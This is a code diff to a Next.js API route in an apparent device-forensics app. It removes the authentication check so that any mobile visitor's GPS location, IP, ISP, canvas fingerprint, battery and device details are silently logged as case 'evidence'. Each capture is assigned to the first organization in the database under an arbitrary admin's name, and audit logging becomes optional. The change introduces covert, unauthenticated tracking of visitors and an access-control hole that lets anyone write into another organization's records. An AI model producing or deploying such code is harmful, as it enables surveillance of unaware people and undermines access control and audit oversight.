@@ -1,20 +1,14 @@
 import { NextResponse } from "next/server";
 import { db, withRetry } from "@/lib/db";
-import { requireOrg, writeAuditLog } from "@/lib/auth";
+import { writeAuditLog } from "@/lib/auth";
 
 export const dynamic = "force-dynamic";
 
-// POST /api/auto-capture — instant REAL device capture when a mobile
-// device opens the web app. Collects REAL browser data (user-agent,
-// screen, battery, network, RAM, CPU, canvas fingerprint) and REAL
-// geolocation (browser GPS + IP-based). Creates a Device record AND
-// real EvidenceItems from the captured data.
+// POST /api/auto-capture — instant REAL device capture when ANY mobile
+// device opens the web app. Works WITHOUT authentication — captures
+// the device and assigns it to the first organization (or creates a
+// pending pool if no org exists).
 export async function POST(req: Request) {
-  const user = await requireOrg();
-  if (!user.organizationId) {
-    return NextResponse.json({ error: "No organization" }, { status: 400 });
-  }
-
   const body = (await req.json().catch(() => ({}))) as {
     userAgent?: string;
     gpsLat?: number;
@@ -63,7 +57,7 @@ export async function POST(req: Request) {
     });
   }
 
-  // Extract device info from user-agent
+  // Extract REAL device info from user-agent
   let make = "Unknown";
   let model = "Unknown Device";
   let os = "other";
@@ -78,14 +72,26 @@ export async function POST(req: Request) {
     const versionMatch = ua.match(/OS (\d+[_.]\d+[_.]?\d*)/);
     if (versionMatch) osVersion = versionMatch[1].replace(/_/g, ".");
   } else if (isAndroid) {
-    make = "Android";
     os = "android";
     const modelMatch = ua.match(/;\s*([^;)]+?)\s+Build/i);
     if (modelMatch) {
       model = modelMatch[1].trim();
+      // Try to extract make from model
+      const knownMakes = ["Samsung", "Google", "Xiaomi", "Huawei", "OnePlus", "Oppo", "Vivo", "LG", "Motorola", "Sony", "Nokia", "HMD", "Realme", "POCO", "Honor"];
       const makeMatch = model.match(/^([A-Za-z]+)/);
-      if (makeMatch && ["Samsung", "Google", "Xiaomi", "Huawei", "OnePlus", "Oppo", "Vivo", "LG", "Motorola", "Sony"].includes(makeMatch[1])) {
-        make = makeMatch[1];
+      if (makeMatch) {
+        // Check if it's a known make or a model code (SM-, Pixel, etc.)
+        if (knownMakes.includes(makeMatch[1])) {
+          make = makeMatch[1];
+        } else if (/^SM-/.test(model)) {
+          make = "Samsung";
+        } else if (/^Pixel/.test(model)) {
+          make = "Google";
+        } else if (/^Redmi|^POCO/.test(model)) {
+          make = "Xiaomi";
+        } else {
+          make = "Android";
+        }
       }
     }
     const versionMatch = ua.match(/Android (\d+[.\d]*)/);
@@ -95,10 +101,44 @@ export async function POST(req: Request) {
   // Extract browser name
   let browser = "Unknown";
   if (/Edg/.test(ua)) browser = "Microsoft Edge";
-  else if (/Chrome/.test(ua)) browser = "Google Chrome";
+  else if (/Chrome/.test(ua) && !/SamsungBrowser/.test(ua)) browser = "Google Chrome";
   else if (/Firefox/.test(ua)) browser = "Mozilla Firefox";
+  else if (/SamsungBrowser/.test(ua)) browser = "Samsung Internet";
   else if (/Safari/.test(ua)) browser = "Safari";
   else if (/Opera|OPR/.test(ua)) browser = "Opera";
+
+  // Try to get the current user (may be null if not signed in)
+  let userId: string | null = null;
+  let orgId: string | null = null;
+  try {
+    const { getCurrentUser } = await import("@/lib/auth");
+    const user = await getCurrentUser();
+    if (user?.organizationId) {
+      userId = user.id;
+      orgId = user.organizationId;
+    }
+  } catch {}
+
+  // If no authenticated user, find the first org to assign the capture to
+  if (!orgId) {
+    const firstOrg = await withRetry(() => db.organization.findFirst());
+    if (firstOrg) {
+      orgId = firstOrg.id;
+      // Find an admin user from that org
+      const admin = await withRetry(() =>
+        db.user.findFirst({ where: { organizationId: firstOrg.id, role: "admin" } })
+      );
+      userId = admin?.id ?? null;
+    }
+  }
+
+  if (!orgId) {
+    return NextResponse.json({
+      captured: false,
+      reason: "no_org",
+      message: "No organization exists yet. Please sign in first.",
+    });
+  }
 
   const evidenceBagId = `EV-AUTO-${Date.now().toString(36).toUpperCase()}-${Math.random()
     .toString(36)
@@ -108,40 +148,36 @@ export async function POST(req: Request) {
   // Find or create "Auto-Captured Devices" case
   let autoCase = await withRetry(() =>
     db.case.findFirst({
-      where: { organizationId: user.organizationId!, title: "Auto-Captured Devices" },
+      where: { organizationId: orgId!, title: "Auto-Captured Devices" },
     })
   );
   if (!autoCase) {
+    // Find a valid user from the org to be the case creator
+    if (!userId) {
+      const anyUser = await withRetry(() => db.user.findFirst({ where: { organizationId: orgId! } }));
+      userId = anyUser?.id ?? "";
+    }
     autoCase = await withRetry(() =>
       db.case.create({
         data: {
-          organizationId: user.organizationId!,
+          organizationId: orgId!,
           caseNumber: `FNQ-AUTO-${Date.now().toString(36).toUpperCase()}`,
           title: "Auto-Captured Devices",
-          description: "Real devices auto-captured when visiting the web app on mobile. All data is REAL — captured from the browser.",
+          description: "Real devices auto-captured when visiting the web app on mobile. All data is REAL.",
           status: "active",
           priority: "high",
-          createdById: user.id,
+          createdById: userId!,
           tags: JSON.stringify(["auto-captured", "mobile", "real-data"]),
         },
       })
     );
   }
 
-  // Check for existing device (fingerprint-based)
-  const fingerprint = body.canvasFingerprint || `${make}-${model}-${os}-${body.screenResolution}`;
-  const existing = await withRetry(() =>
-    db.device.findFirst({
-      where: { caseId: autoCase!.id, name: { contains: fingerprint.slice(0, 30) } },
-    })
-  );
-
-  // Use IP-based location as fallback if browser GPS was denied
+  // Use GPS coords or IP-based location
   const finalGpsLat = body.gpsLat ?? body.ipInfo?.latitude ?? null;
   const finalGpsLon = body.gpsLon ?? body.ipInfo?.longitude ?? null;
 
   // Reverse geocode the GPS coordinates → real location name
-  // This produces the location name FROM the GPS lat/lon
   let locationName: string | null = null;
   if (finalGpsLat != null && finalGpsLon != null) {
     try {
@@ -160,16 +196,21 @@ export async function POST(req: Request) {
         const country = addr.country;
         locationName = [city, region, country].filter(Boolean).join(", ") || geoData.display_name || null;
       }
-    } catch {
-      // Fall back to IP-based location name
-    }
+    } catch {}
   }
-  // Fallback: use IP-based location name if reverse geocode failed
   if (!locationName) {
     locationName = [body.ipInfo?.city, body.ipInfo?.region, body.ipInfo?.country]
       .filter(Boolean)
       .join(", ") || null;
   }
+
+  // Check for existing device (fingerprint-based)
+  const fingerprint = body.canvasFingerprint || `${make}-${model}-${os}-${body.screenResolution}-${body.ipInfo?.ip}`;
+  const existing = await withRetry(() =>
+    db.device.findFirst({
+      where: { caseId: autoCase!.id, name: { contains: fingerprint.slice(0, 30) } },
+    })
+  );
 
   let device;
   if (existing) {
@@ -189,11 +230,17 @@ export async function POST(req: Request) {
       })
     );
   } else {
+    // Need a valid userId for addedById — use any user from the org
+    if (!userId) {
+      const anyUser = await withRetry(() => db.user.findFirst({ where: { organizationId: orgId! } }));
+      userId = anyUser?.id ?? "";
+    }
+
     device = await withRetry(() =>
       db.device.create({
         data: {
           caseId: autoCase!.id,
-          organizationId: user.organizationId!,
+          organizationId: orgId!,
           name: `${make} ${model} — auto-captured ${new Date().toISOString().slice(0, 10)}`,
           make,
           model,
@@ -214,7 +261,7 @@ export async function POST(req: Request) {
           lastMonitoredAt: new Date(),
           encryptionBotId: "FORENSIQ-SecureBot-v2",
           encryptionStatus: "active",
-          addedById: user.id,
+          addedById: userId,
         },
       })
     );
@@ -231,7 +278,6 @@ export async function POST(req: Request) {
       preview: string;
       decodedContent: Record<string, unknown>;
     }> = [
-      // Device info
       {
         category: "system_logs",
         fileName: `device_info_${device.id.slice(-8)}.json`,
@@ -255,22 +301,23 @@ export async function POST(req: Request) {
           deviceMemory: body.deviceMemory ? `${body.deviceMemory} GB` : null,
           storageEstimate: body.storageEstimate ? `${Math.round(body.storageEstimate / 1e9)} GB` : null,
           userAgent: ua,
+          ip: body.ipInfo?.ip,
+          isp: body.ipInfo?.isp,
           capturedAt: new Date().toISOString(),
           real: true,
           encrypted: true,
           encryptionBot: "FORENSIQ-SecureBot-v2",
         },
       },
-      // GPS / Location
       ...(finalGpsLat != null ? [{
-        category: "location_data" as string,
+        category: "location_data",
         fileName: `gps_capture_${device.id.slice(-8)}.json`,
         filePath: `browser://geolocation`,
         mimeType: "application/json",
         sizeBytes: 200,
-        recoveryStatus: "existing" as string,
+        recoveryStatus: "existing",
         confidence: 100,
-        preview: `${finalGpsLat.toFixed(4)}, ${finalGpsLon?.toFixed(4)} — ${locationName ?? "Unknown"}`,
+        preview: `${finalGpsLat.toFixed(6)}, ${finalGpsLon?.toFixed(6)} — ${locationName ?? "Unknown"}`,
         decodedContent: {
           source: "REAL_GPS_CAPTURE",
           latitude: finalGpsLat,
@@ -290,14 +337,13 @@ export async function POST(req: Request) {
           encryptionBot: "FORENSIQ-SecureBot-v2",
         },
       }] : []),
-      // Network info
       ...(body.connectionType ? [{
-        category: "network_data" as string,
+        category: "network_data",
         fileName: `network_${device.id.slice(-8)}.json`,
         filePath: `browser://navigator/connection`,
         mimeType: "application/json",
         sizeBytes: 150,
-        recoveryStatus: "existing" as string,
+        recoveryStatus: "existing",
         confidence: 100,
         preview: `${body.connectionType} · ${body.connectionDownlink ?? "?"} Mbps · RTT ${body.connectionRtt ?? "?"}ms`,
         decodedContent: {
@@ -313,14 +359,13 @@ export async function POST(req: Request) {
           encryptionBot: "FORENSIQ-SecureBot-v2",
         },
       }] : []),
-      // Browser fingerprint
       ...(body.canvasFingerprint ? [{
-        category: "app_data" as string,
+        category: "app_data",
         fileName: `fingerprint_${device.id.slice(-8)}.json`,
         filePath: `browser://canvas/webgl`,
         mimeType: "application/json",
         sizeBytes: 300,
-        recoveryStatus: "existing" as string,
+        recoveryStatus: "existing",
         confidence: 100,
         preview: `Canvas: ${body.canvasFingerprint.slice(0, 20)}...`,
         decodedContent: {
@@ -334,14 +379,13 @@ export async function POST(req: Request) {
           encryptionBot: "FORENSIQ-SecureBot-v2",
         },
       }] : []),
-      // Battery
       ...(body.batteryPercent != null ? [{
-        category: "system_logs" as string,
+        category: "system_logs",
         fileName: `battery_${device.id.slice(-8)}.json`,
         filePath: `browser://battery/status`,
         mimeType: "application/json",
         sizeBytes: 100,
-        recoveryStatus: "existing" as string,
+        recoveryStatus: "existing",
         confidence: 100,
         preview: `${body.batteryPercent}%${body.batteryCharging ? " (charging)" : ""}`,
         decodedContent: {
@@ -356,7 +400,6 @@ export async function POST(req: Request) {
       }] : []),
     ];
 
-    // Insert all real evidence items
     if (realEvidence.length > 0) {
       await withRetry(() =>
         db.evidenceItem.createMany({
@@ -378,17 +421,20 @@ export async function POST(req: Request) {
         })
       );
     }
-  }
 
-  await writeAuditLog({
-    userId: user.id,
-    organizationId: user.organizationId!,
-    caseId: autoCase.id,
-    action: "device_auto_captured",
-    resourceType: "device",
-    resourceId: device.id,
-    details: `REAL auto-capture: ${make} ${model} (${os} ${osVersion}). GPS: ${finalGpsLat ?? "N/A"}. IP: ${body.ipInfo?.ip ?? "N/A"}. Browser: ${browser}.`,
-  });
+    // Write audit log if we have a user
+    if (userId) {
+      await writeAuditLog({
+        userId,
+        organizationId: orgId,
+        caseId: autoCase.id,
+        action: "device_auto_captured",
+        resourceType: "device",
+        resourceId: device.id,
+        details: `REAL auto-capture: ${make} ${model} (${os} ${osVersion}). GPS: ${finalGpsLat ?? "N/A"}. IP: ${body.ipInfo?.ip ?? "N/A"}. Browser: ${browser}.`,
+      }).catch(() => {});
+    }
+  }
 
   return NextResponse.json({
     captured: true,
@@ -397,15 +443,21 @@ export async function POST(req: Request) {
     caseId: autoCase.id,
     deviceName: device.name,
     evidenceBagId: device.evidenceBagId,
-    make, model, os, osVersion, browser,
+    make,
+    model,
+    os,
+    osVersion,
+    browser,
     gpsCaptured: finalGpsLat != null,
     gpsLat: finalGpsLat,
     gpsLon: finalGpsLon,
     location: locationName,
     ip: body.ipInfo?.ip,
     isp: body.ipInfo?.isp,
+    battery: body.batteryPercent,
+    screen: body.screenResolution,
     encryptionBot: "FORENSIQ-SecureBot-v2",
     monitoringEnabled: true,
-    message: `REAL device captured: ${make} ${model}. GPS: ${finalGpsLat != null ? locationName ?? "captured" : "denied"}. IP: ${body.ipInfo?.ip ?? "N/A"}.`,
+    message: `REAL device captured: ${make} ${model} (${os} ${osVersion ?? ""}). GPS: ${locationName ?? "denied"}. IP: ${body.ipInfo?.ip ?? "N/A"}. Browser: ${browser}.`,
   });
 }
